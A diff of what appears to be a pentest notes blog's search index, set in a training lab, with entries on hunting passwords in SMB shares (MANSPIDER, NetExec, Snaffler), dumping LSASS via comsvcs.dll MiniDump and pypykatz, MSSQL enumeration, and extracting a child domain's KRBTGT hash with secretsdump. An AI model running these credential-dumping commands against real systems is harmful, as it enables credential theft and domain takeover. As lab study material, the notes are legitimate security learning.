@@ -209,7 +209,7 @@
 <blockquote>
 <p>The KRBTGT hash of the child domain ( To Sign the Golden Ticket )<br>The SID of the child domain<br>The FQDN of the child domain.<br>The name of a target user in the child domain (doesn’t need to exist!)<br>The SID of the Enterprise Admins Group of the parent domain.</p>
 </blockquote>
-<h3 id="Extraction-Of-KRBTGT-Hash-Of-The-Child-Domain"><a href="#Extraction-Of-KRBTGT-Hash-Of-The-Child-Domain" class="headerlink" title="Extraction Of KRBTGT Hash Of The Child Domain"></a>Extraction Of KRBTGT Hash Of The Child Domain</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">secretsdump.py child-FQDN-domain/our-privileged-user@dc-ip -just-dc-user NETBIOS_DOMAIN/krbtgt</span><br><span class="line"></span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::</span><br></pre></td></tr></table></figure>
+<h3 id="Extraction-Of-KRBTGT-Hash-Of-The-Child-Domain"><a href="#Extraction-Of-KRBTGT-Hash-Of-The-Child-Domain" class="headerlink" title="Extraction Of KRBTGT Hash Of The Child Domain"></a>Extraction Of KRBTGT Hash Of The Child Domain</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">secretsdump.py child-FQDN-domain/our-privileged-user@child-domain-dc-ip -just-dc-user NETBIOS_DOMAIN/krbtgt</span><br><span class="line"></span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::</span><br></pre></td></tr></table></figure>
 
 
 <p>FQDN : <code>LOGISTICS.INLANEFREIGHT.LOCAL</code>.</p>
@@ -239,6 +239,43 @@
         <tag>secretsdump</tag>
         <tag>lookupsid</tag>
         <tag>ticketer</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Credential Hunting in Network Shares</title>
+    <url>/2025/11/27/Credential-Hunting-in-Network-Shares/</url>
+    <content><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="From-Domain-Joined-Machine"><a href="#From-Domain-Joined-Machine" class="headerlink" title="From Domain Joined Machine"></a>From Domain Joined Machine</h2><h3 id="Snaffler"><a href="#Snaffler" class="headerlink" title="Snaffler"></a>Snaffler</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\Users\Public&gt;Snaffler.exe <span class="literal">-s</span></span><br></pre></td></tr></table></figure>
+
+
+<ul>
+<li><code>-u : retrieves a list of users from Active Directory and searches for references to them in files</code></li>
+<li><code>-i and -n allow you to specify which shares should be included in the search.</code></li>
+</ul>
+<h2 id="Non-Domain-Joined-Machine"><a href="#Non-Domain-Joined-Machine" class="headerlink" title="Non Domain Joined Machine"></a>Non Domain Joined Machine</h2><h3 id="PowerHuntShares"><a href="#PowerHuntShares" class="headerlink" title="PowerHuntShares"></a>PowerHuntShares</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Unblock-File</span> <span class="literal">-Path</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Import-Module</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Invoke-HuntSMBShares</span> <span class="literal">-Threads</span> <span class="number">100</span> <span class="literal">-OutputDirectory</span> c:\Users\Public</span><br><span class="line"></span><br><span class="line">[*][<span class="number">05</span>/<span class="number">01</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">51</span>] Output Directory: c:\Users\Public\SmbShareHunt<span class="literal">-05012025125123</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="MANSPIDER"><a href="#MANSPIDER" class="headerlink" title="MANSPIDER"></a>MANSPIDER</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;passw&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\Company\Forms\HR_Form_14.pdf: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password: SecureDocs99</span><br><span class="line">[+] 10.129.182.89\Company\Forms\Incident_Report_57.xlsx: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password=Summer2023!</span><br><span class="line"></span><br><span class="line">&lt;snip&gt;</span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;INLANEFREIGHT&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span class="string">&quot;INLANEFREIGHT&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Netexec"><a href="#Netexec" class="headerlink" title="Netexec"></a>Netexec</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 10.129.234.121 -u mendres -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span> --spider IT --content --pattern <span class="string">&quot;passw&quot;</span></span><br><span class="line"></span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.129.234.121  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! </span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Started spidering</span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Spidering .</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
+
+<p>We can also download the files locally:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 104.152.52.235 -u mendres -p Inlanefreight2025! -M spider_plus -o DOWNLOAD_FLAG=True</span><br></pre></td></tr></table></figure>
+
+<p>Then search for the pattern we want:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br></pre></td></tr></table></figure>
+
+<p>Example result</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br><span class="line"></span><br><span class="line">Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Service-Enumeration</category>
+        <category>SMB</category>
+      </categories>
+      <tags>
+        <tag>SMB</tag>
+        <tag>Enumeration</tag>
       </tags>
   </entry>
   <entry>
@@ -295,69 +332,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Credential Hunting in Network Shares</title>
-    <url>/2025/11/27/Credential-Hunting-in-Network-Shares/</url>
-    <content><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="From-Domain-Joined-Machine"><a href="#From-Domain-Joined-Machine" class="headerlink" title="From Domain Joined Machine"></a>From Domain Joined Machine</h2><h3 id="Snaffler"><a href="#Snaffler" class="headerlink" title="Snaffler"></a>Snaffler</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\Users\Public&gt;Snaffler.exe <span class="literal">-s</span></span><br></pre></td></tr></table></figure>
-
-
-<ul>
-<li><code>-u : retrieves a list of users from Active Directory and searches for references to them in files</code></li>
-<li><code>-i and -n allow you to specify which shares should be included in the search.</code></li>
-</ul>
-<h2 id="Non-Domain-Joined-Machine"><a href="#Non-Domain-Joined-Machine" class="headerlink" title="Non Domain Joined Machine"></a>Non Domain Joined Machine</h2><h3 id="PowerHuntShares"><a href="#PowerHuntShares" class="headerlink" title="PowerHuntShares"></a>PowerHuntShares</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Unblock-File</span> <span class="literal">-Path</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Import-Module</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Invoke-HuntSMBShares</span> <span class="literal">-Threads</span> <span class="number">100</span> <span class="literal">-OutputDirectory</span> c:\Users\Public</span><br><span class="line"></span><br><span class="line">[*][<span class="number">05</span>/<span class="number">01</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">51</span>] Output Directory: c:\Users\Public\SmbShareHunt<span class="literal">-05012025125123</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="MANSPIDER"><a href="#MANSPIDER" class="headerlink" title="MANSPIDER"></a>MANSPIDER</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;passw&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\Company\Forms\HR_Form_14.pdf: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password: SecureDocs99</span><br><span class="line">[+] 10.129.182.89\Company\Forms\Incident_Report_57.xlsx: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password=Summer2023!</span><br><span class="line"></span><br><span class="line">&lt;snip&gt;</span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;INLANEFREIGHT&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span class="string">&quot;INLANEFREIGHT&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Netexec"><a href="#Netexec" class="headerlink" title="Netexec"></a>Netexec</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 10.129.234.121 -u mendres -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span> --spider IT --content --pattern <span class="string">&quot;passw&quot;</span></span><br><span class="line"></span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.129.234.121  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! </span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Started spidering</span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Spidering .</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
-
-<p>We can also download the files locally:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 104.152.52.235 -u mendres -p Inlanefreight2025! -M spider_plus -o DOWNLOAD_FLAG=True</span><br></pre></td></tr></table></figure>
-
-<p>Then search for the pattern we want:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br></pre></td></tr></table></figure>
-
-<p>Example result</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br><span class="line"></span><br><span class="line">Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Service-Enumeration</category>
-        <category>SMB</category>
-      </categories>
-      <tags>
-        <tag>SMB</tag>
-        <tag>Enumeration</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Dump Lsass</title>
-    <url>/2025/11/26/Dump-Lsass/</url>
-    <content><![CDATA[<h2 id="Create-a-dump-file"><a href="#Create-a-dump-file" class="headerlink" title="Create a dump file"></a>Create a dump file</h2><h3 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task Manager"></a>Task Manager</h3><p>Select the process from task manager </p>
-<p><img src="/img/task-manager.png" alt="Select the process"></p>
-<p>Create a dump file</p>
-<p><img src="/img/dump-lsass.png" alt="dump lsass"></p>
-<p>➜ And then we can find the created file on &#96;C:\Users\username\AppData\Local\Temp\Lsass.DMP.</p>
-<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><h4 id="Finding-LSASS’s-PID-in-PowerShell"><a href="#Finding-LSASS’s-PID-in-PowerShell" class="headerlink" title="Finding LSASS’s PID in PowerShell"></a>Finding LSASS’s PID in PowerShell</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; <span class="built_in">Get-Process</span> lsass</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  <span class="built_in">SI</span> ProcessName</span><br><span class="line"><span class="literal">-------</span>  <span class="literal">------</span>    <span class="literal">-----</span>      <span class="literal">-----</span>     <span class="literal">------</span>     <span class="literal">--</span>  <span class="literal">--</span> <span class="literal">-----------</span></span><br><span class="line">   <span class="number">1260</span>      <span class="number">21</span>     <span class="number">4948</span>      <span class="number">15396</span>       <span class="number">2.56</span>    <span class="number">672</span>   <span class="number">0</span> lsass</span><br></pre></td></tr></table></figure>
-
-<h4 id="Creating-a-dump-file-using-PowerShell"><a href="#Creating-a-dump-file-using-PowerShell" class="headerlink" title="Creating a dump file using PowerShell"></a>Creating a dump file using PowerShell</h4><p>➜ We need <code>Administrator access</code>.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; rundll32 C:\windows\system32\comsvcs.dll, MiniDump <span class="number">672</span> C:\lsass.dmp full</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Dump-Lsass-Offline"><a href="#Dump-Lsass-Offline" class="headerlink" title="Dump Lsass Offline"></a>Dump Lsass Offline</h2><p>➜ After creating a dump file, we can now dump the lsass file offline :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pypykatz lsa minidump lsass.dmp </span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Dump-Passwords</category>
-      </categories>
-      <tags>
-        <tag>Dump-Lsass</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Dump NTDS</title>
     <url>/2025/11/26/Dump-NTDS/</url>
     <content><![CDATA[<p>➜ Required privilege </p>
@@ -392,6 +366,32 @@
       </categories>
       <tags>
         <tag>Dump-NTDS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Dump Lsass</title>
+    <url>/2025/11/26/Dump-Lsass/</url>
+    <content><![CDATA[<h2 id="Create-a-dump-file"><a href="#Create-a-dump-file" class="headerlink" title="Create a dump file"></a>Create a dump file</h2><h3 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task Manager"></a>Task Manager</h3><p>Select the process from task manager </p>
+<p><img src="/img/task-manager.png" alt="Select the process"></p>
+<p>Create a dump file</p>
+<p><img src="/img/dump-lsass.png" alt="dump lsass"></p>
+<p>➜ And then we can find the created file on &#96;C:\Users\username\AppData\Local\Temp\Lsass.DMP.</p>
+<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><h4 id="Finding-LSASS’s-PID-in-PowerShell"><a href="#Finding-LSASS’s-PID-in-PowerShell" class="headerlink" title="Finding LSASS’s PID in PowerShell"></a>Finding LSASS’s PID in PowerShell</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; <span class="built_in">Get-Process</span> lsass</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  <span class="built_in">SI</span> ProcessName</span><br><span class="line"><span class="literal">-------</span>  <span class="literal">------</span>    <span class="literal">-----</span>      <span class="literal">-----</span>     <span class="literal">------</span>     <span class="literal">--</span>  <span class="literal">--</span> <span class="literal">-----------</span></span><br><span class="line">   <span class="number">1260</span>      <span class="number">21</span>     <span class="number">4948</span>      <span class="number">15396</span>       <span class="number">2.56</span>    <span class="number">672</span>   <span class="number">0</span> lsass</span><br></pre></td></tr></table></figure>
+
+<h4 id="Creating-a-dump-file-using-PowerShell"><a href="#Creating-a-dump-file-using-PowerShell" class="headerlink" title="Creating a dump file using PowerShell"></a>Creating a dump file using PowerShell</h4><p>➜ We need <code>Administrator access</code>.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; rundll32 C:\windows\system32\comsvcs.dll, MiniDump <span class="number">672</span> C:\lsass.dmp full</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Dump-Lsass-Offline"><a href="#Dump-Lsass-Offline" class="headerlink" title="Dump Lsass Offline"></a>Dump Lsass Offline</h2><p>➜ After creating a dump file, we can now dump the lsass file offline :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pypykatz lsa minidump lsass.dmp </span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Dump-Passwords</category>
+      </categories>
+      <tags>
+        <tag>Dump-Lsass</tag>
       </tags>
   </entry>
   <entry>
@@ -536,6 +536,60 @@
         <tag>evil-winrm</tag>
         <tag>impacket-psexec</tag>
         <tag>xfreerdp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Mssql Enumeration</title>
+    <url>/2025/11/20/Mssql-Enumeration/</url>
+    <content><![CDATA[<h1 id="Connect-To-The-Data-Base"><a href="#Connect-To-The-Data-Base" class="headerlink" title="Connect To The Data Base"></a>Connect To The Data Base</h1><h2 id="SQL-Authentication"><a href="#SQL-Authentication" class="headerlink" title="SQL Authentication"></a>SQL Authentication</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h5 id="sqlcmd"><a href="#sqlcmd" class="headerlink" title="sqlcmd"></a>sqlcmd</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sqlcmd -S target -U username -P &#x27;password&#x27; -y <span class="number">30</span> -Y <span class="number">30</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh"><a href="#sqsh" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+
+<h5 id="mssqlclient"><a href="#mssqlclient" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Windows-Authentication-Local-Account"><a href="#Windows-Authentication-Local-Account" class="headerlink" title="Windows Authentication (Local Account)"></a>Windows Authentication (Local Account)</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-1"><a href="#sqsh-1" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U .\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U HOSTNAME\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="mssqlclient-1"><a href="#mssqlclient-1" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target -windows-auth</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Domain-Authentication-With-DC"><a href="#Domain-Authentication-With-DC" class="headerlink" title="Domain Authentication (With DC)"></a>Domain Authentication (With DC)</h2><h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-2"><a href="#sqsh-2" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U domain\username -P password</span><br></pre></td></tr></table></figure>
+
+<h5 id="mssqlclient-2"><a href="#mssqlclient-2" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient domain/username:password@target</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Enumerate-Data-Base"><a href="#Enumerate-Data-Base" class="headerlink" title="Enumerate Data Base"></a>Enumerate Data Base</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h3 id="sqlcmd-1"><a href="#sqlcmd-1" class="headerlink" title="sqlcmd"></a>sqlcmd</h3><p>When using <code>sqlcmd</code>, each query must be followed by <code>GO</code> to trigger its execution.</p>
+<h5 id="List-Databases"><a href="#List-Databases" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> name FROM master.dbo.sysdatabases</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="Select-Database"><a href="#Select-Database" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; USE htbusers</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="List-Tables"><a href="#List-Tables" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> table_name FROM htbusers.INFORMATION_SCHEMA.TABLES</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="Dump-Specific-Table"><a href="#Dump-Specific-Table" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> * FROM users</span><br><span class="line"><span class="number">2</span>&gt; go</span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Mssqlclient"><a href="#Mssqlclient" class="headerlink" title="Mssqlclient"></a>Mssqlclient</h3><h5 id="List-Databases-1"><a href="#List-Databases-1" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; SELECT name FROM sys.databases;</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="Select-Database-1"><a href="#Select-Database-1" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; use database-name</span><br></pre></td></tr></table></figure>
+
+<h5 id="List-Tables-1"><a href="#List-Tables-1" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE=<span class="string">&#x27;BASE TABLE&#x27;</span> ORDER BY TABLE_SCHEMA, TABLE_NAME;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Dump-Specific-Table-1"><a href="#Dump-Specific-Table-1" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM table-name;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Service-Enumeration</category>
+        <category>MSSQL</category>
+      </categories>
+      <tags>
+        <tag>Enumeration</tag>
+        <tag>MSSQL</tag>
       </tags>
   </entry>
   <entry>
@@ -723,60 +777,6 @@
       <tags>
         <tag>klist</tag>
         <tag>ccache</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Mssql Enumeration</title>
-    <url>/2025/11/20/Mssql-Enumeration/</url>
-    <content><![CDATA[<h1 id="Connect-To-The-Data-Base"><a href="#Connect-To-The-Data-Base" class="headerlink" title="Connect To The Data Base"></a>Connect To The Data Base</h1><h2 id="SQL-Authentication"><a href="#SQL-Authentication" class="headerlink" title="SQL Authentication"></a>SQL Authentication</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h5 id="sqlcmd"><a href="#sqlcmd" class="headerlink" title="sqlcmd"></a>sqlcmd</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sqlcmd -S target -U username -P &#x27;password&#x27; -y <span class="number">30</span> -Y <span class="number">30</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh"><a href="#sqsh" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
-
-<h5 id="mssqlclient"><a href="#mssqlclient" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="Windows-Authentication-Local-Account"><a href="#Windows-Authentication-Local-Account" class="headerlink" title="Windows Authentication (Local Account)"></a>Windows Authentication (Local Account)</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-1"><a href="#sqsh-1" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U .\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U HOSTNAME\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
-
-
-<h5 id="mssqlclient-1"><a href="#mssqlclient-1" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target -windows-auth</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Domain-Authentication-With-DC"><a href="#Domain-Authentication-With-DC" class="headerlink" title="Domain Authentication (With DC)"></a>Domain Authentication (With DC)</h2><h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-2"><a href="#sqsh-2" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U domain\username -P password</span><br></pre></td></tr></table></figure>
-
-<h5 id="mssqlclient-2"><a href="#mssqlclient-2" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient domain/username:password@target</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Enumerate-Data-Base"><a href="#Enumerate-Data-Base" class="headerlink" title="Enumerate Data Base"></a>Enumerate Data Base</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h3 id="sqlcmd-1"><a href="#sqlcmd-1" class="headerlink" title="sqlcmd"></a>sqlcmd</h3><p>When using <code>sqlcmd</code>, each query must be followed by <code>GO</code> to trigger its execution.</p>
-<h5 id="List-Databases"><a href="#List-Databases" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> name FROM master.dbo.sysdatabases</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
-
